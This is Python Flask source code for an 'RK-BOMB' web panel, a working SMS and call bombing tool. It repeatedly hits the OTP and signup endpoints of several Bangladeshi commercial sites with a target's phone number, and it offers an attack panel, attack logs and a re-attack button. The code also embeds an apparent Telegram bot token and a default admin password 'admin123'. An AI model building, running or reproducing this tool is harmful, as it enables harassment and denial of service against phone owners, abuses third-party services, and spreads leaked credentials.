import requests, threading, os, time, sqlite3, random
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = "RK_ULTRA_CALL_SMS_V30"

# ---------- CONFIG ----------
TG_BOT_TOKEN = "8694093332:AAGOOWD8Ms_KoRZJFHC58mqLkEQozA2aOx4"
MY_CHAT_ID = "6048050987" 
ADMIN_USERNAME = "admin"

# ---------- DATABASE ----------
def get_db():
    conn = sqlite3.connect('system_rk_ultimate.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS history (
        id INTEGER PRIMARY KEY, username TEXT, phone TEXT, success INTEGER, total INTEGER, 
        limit_amt INTEGER, type TEXT, status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, date_str TEXT)''')
    try:
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        conn.execute("INSERT INTO users VALUES (?, ?, ?)", (ADMIN_USERNAME, generate_password_hash("admin123"), "approved"))
        conn.commit()
    except: pass
    conn.close()

init_db()

# ---------- API LISTS ----------
SMS_APIS = [
    "https://bikroy.com/data/is_valid_contact?contact={phone}",
    "https://api.redx.com.bd/v1/user/signup?phone={phone}",
    "https://api.osudpotro.com/api/v1/users/send_otp?phone={phone}",
    "https://pathao.com/api/v1/user/otp/send?phone={phone}",
    "https://api.chaldal.com/api/customer/SendLoginOTP?phoneNumber={phone}"
]

CALL_APIS = [
    "https://api.fundesh.com.bd/api/auth/login-otp?phone={phone}", # Call/SMS Mixed
    "https://www.shajgoj.com/wp-admin/admin-ajax.php?action=shajgoj_send_otp&mobile={phone}",
    "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={phone}"
]

# ---------- ENGINE ----------
active_sessions = {}

def bombing_task(username, phone, limit, b_type, start_dt):
    key = f"{username}_{phone}"
    api_list = SMS_APIS if b_type == 'SMS' else CALL_APIS
    
    while key in active_sessions:
        curr = active_sessions[key]
        if curr['total'] >= curr['limit']:
            stop_dt = datetime.now()
            duration = str(stop_dt - start_dt).split('.')[0]
            conn = get_db()
            conn.execute('''INSERT INTO history VALUES (NULL,?,?,?,?,?,?,?,?,?,?,?)''',
                (username, phone, curr['success'], curr['total'], curr['limit'], b_type, "Completed", 
                 curr['start_time'], stop_dt.strftime("%I:%M %p"), duration, start_dt.strftime("%d/%m/%Y")))
            conn.commit(); conn.close()
            del active_sessions[key]; break
        
        if curr['status'] == 'Running':
            try:
                target = random.choice(api_list).format(phone=phone)
                r = requests.get(target, timeout=5)
                if r.status_code == 200:
                    active_sessions[key]['success'] += 1
                    active_sessions[key]['new_hit'] = True
            except: pass
            active_sessions[key]['total'] += 1
            time.sleep(2 if b_type == 'CALL' else 1.2) # Call bombing e ektu beshi gap lage
        else: time.sleep(2)

# ---------- UI DESIGN ----------
HTML_LAYOUT = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>RK-BOMB ★ ULTIMATE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;600&display=swap" rel="stylesheet">
    <style>
        body { background: #000; color: #0f0; font-family: 'Rajdhani', sans-serif; margin: 0; }
        .header { background: #0a0a0a; padding: 15px; border-bottom: 2px solid #0f0; display: flex; justify-content: space-between; position: sticky; top:0; z-index:100; box-shadow: 0 0 10px #0f0; }
        .sidebar { height: 100%; width: 0; position: fixed; z-index: 1001; top: 0; left: 0; background: rgba(0,0,0,0.95); transition: 0.3s; padding-top: 60px; border-right: 1px solid #0f0; }
        .sidebar a { padding: 15px 25px; text-decoration: none; color: #0f0; display: block; font-family: 'Orbitron'; font-size: 14px; border-bottom: 1px solid #111; }
        .container { padding: 15px; max-width: 500px; margin: auto; }
        .card { background: #0d0d0d; border: 1px solid #1f1f1f; padding: 20px; border-radius: 15px; margin-bottom: 20px; border-left: 4px solid #0f0; }
        .card-call { border-left-color: #ff3333; }
        input, select { width: 100%; padding: 12px; background: #000; border: 1px solid #0f0; color: #fff; border-radius: 8px; margin-bottom: 15px; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-bottom: 10px; transition: 0.2s; }
        .btn-start { background: #0f0; color: #000; box-shadow: 0 0 10px #0f0; }
        .btn-pause { background: #ffcc00; color: #000; }
        .btn-stop { background: #ff3333; color: #fff; }
        .progress-bar { background: #0f0; height: 100%; width: 0%; transition: 0.5s; box-shadow: 0 0 10px #0f0; }
        .fire-text { font-family: 'Orbitron'; font-size: 18px; text-align: center; color: #0f0; text-shadow: 0 0 5px #0f0; margin-bottom: 15px; }
    </style>
</head>
<body>
<audio id="hitSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
<div id="rkSidebar" class="sidebar">
    <a href="javascript:void(0)" onclick="closeNav()" style="color:red;">&times; CLOSE MENU</a>
    <a href="/dashboard">🏠 DASHBOARD</a>
    <a href="/history">📜 ATTACK LOGS</a>
    <a href="/logout">🛑 LOGOUT</a>
</div>
<div class="header">
    <span onclick="openNav()" style="font-size:24px; cursor:pointer;">&#9776;</span>
    <span style="font-family:'Orbitron'; color:#0f0;">RK-ULTIMATE ★</span>
    <span></span>
</div>
<div class="container">[CONTENT_HERE]</div>
<script>
    function openNav() { document.getElementById("rkSidebar").style.width = "270px"; }
    function closeNav() { document.getElementById("rkSidebar").style.width = "0"; }
    function playSound() { document.getElementById("hitSound").play().catch(e=>{}); }
</script>
</body>
</html>
'''

# ---------- ROUTES ----------
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form['u'], request.form['p']
        conn = get_db(); user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone(); conn.close()
        if user and check_password_hash(user['password'], p):
            session['user'] = u; return redirect(url_for('dashboard'))
    return render_template_string(HTML_LAYOUT.replace('[CONTENT_HERE]', '<div class="card"><div class="fire-text">RK ACCESS</div><form method="POST"><input name="u" placeholder="USER"><input name="p" type="password" placeholder="PASS"><button class="btn btn-start">LOGIN</button></form></div>'))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(HTML_LAYOUT.replace('[CONTENT_HERE]', '''
        <div class="card">
            <div class="fire-text">🚀 ATTACK PANEL</div>
            <form action="/api/start">
                <input name="num" placeholder="01XXXXXXXXX" required>
                <input name="amt" type="number" placeholder="LIMIT" required>
                <select name="type">
                    <option value="SMS">SMS BOMBING</option>
                    <option value="CALL">CALL BOMBING (VIP)</option>
                </select>
                <button class="btn btn-start">LAUNCH ATTACK</button>
            </form>
        </div>
        <div id="live"></div>
        <script>
            function update() {
                fetch('/api/status').then(r => r.json()).then(data => {
                    let h = '';
                    for(let k in data) {
                        let s = data[k];
                        if(s.new_hit) { playSound(); }
                        let per = Math.round((s.total/s.limit)*100);
                        h += `<div class="card ${s.type == 'CALL' ? 'card-call' : ''}">
                            <div style="display:flex; justify-content:space-between;">
                                <b>📱 ${s.phone} [${s.type}]</b> <span style="font-size:10px; color:#00ccff;">${s.start_time}</span>
                            </div>
                            <div style="background:#222; height:8px; border-radius:4px; margin:10px 0;"><div class="progress-bar" style="width:${per}%; background:${s.type == 'CALL' ? 'red' : '#0f0'}"></div></div>
                            <small>Hits: ${s.success} | Status: ${s.status}</small><br><br>
                            <button class="btn ${s.status == 'Running' ? 'btn-pause' : 'btn-start'}" onclick="location.href='/api/control?num=${s.phone}&action=${s.status == 'Running' ? 'Paused' : 'Running'}'">
                                ${s.status == 'Running' ? '⏸ PAUSE' : '▶ RESUME'}
                            </button>
                            <button class="btn btn-stop" onclick="location.href='/api/stop?num=${s.phone}'">🛑 TERMINATE</button>
                        </div>`;
                    }
                    document.getElementById('live').innerHTML = h;
                });
            }
            setInterval(update, 2000); update();
        </script>
    '''))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    conn = get_db(); rows = conn.execute("SELECT * FROM history WHERE username=? ORDER BY id DESC", (session['user'],)).fetchall(); conn.close()
    h_html = '<h3 class="fire-text">📜 LOGS</h3>'
    for r in rows:
        h_html += f'''
        <div class="card" style="font-size:12px; border-left-color:{'red' if r['type']=='CALL' else '#0f0'}">
            <div style="display:flex; justify-content:space-between;">
                <b>📱 {r['phone']} [{r['type']}]</b> <span style="color:#0f0;">{r['date_str']}</span>
            </div>
            <div style="margin:8px 0;">🕒 {r['start_time']} - {r['stop_time']} | ⏱ {r['duration']}</div>
            <div>✅ Success: {r['success']} / {r['limit_amt']}</div>
            <button class="btn btn-start" style="width:auto; font-size:10px; padding:5px 15px; margin-top:10px;" onclick="location.href='/api/start?num={r['phone']}&amt={r['limit_amt']}&type={r['type']}'">RE-ATTACK</button>
        </div>'''
    return render_template_string(HTML_LAYOUT.replace('[CONTENT_HERE]', h_html))

@app.route('/api/start')
def api_start():
    u, num, amt, b_type = session.get('user'), request.args.get('num'), int(request.args.get('amt', 0)), request.args.get('type', 'SMS')
    if u and num and amt:
        now = datetime.now()
        active_sessions[f"{u}_{num}"] = {'phone': num, 'success': 0, 'total': 0, 'limit': amt, 'type': b_type, 'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'new_hit': False}
        threading.Thread(target=bombing_task, args=(u, num, amt, b_type, now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/control')
def api_control():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = request.args.get('action')
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions:
        s = active_sessions[key]
        conn = get_db()
        conn.execute("INSERT INTO history VALUES (NULL,?,?,?,?,?,?,?,?,?,?,?)",
                     (session['user'], s['phone'], s['success'], s['total'], s['limit'], s['type'], "Stopped", s['start_time'], datetime.now().strftime("%I:%M %p"), "N/A", datetime.now().strftime("%d/%m/%Y")))
        conn.commit(); conn.close(); del active_sessions[key]
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status():
    u = session.get('user', ''); data = {}
    for k, v in active_sessions.items():
        if k.startswith(u):
            data[k] = v.copy(); active_sessions[k]['new_hit'] = False
    return jsonify(data)

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
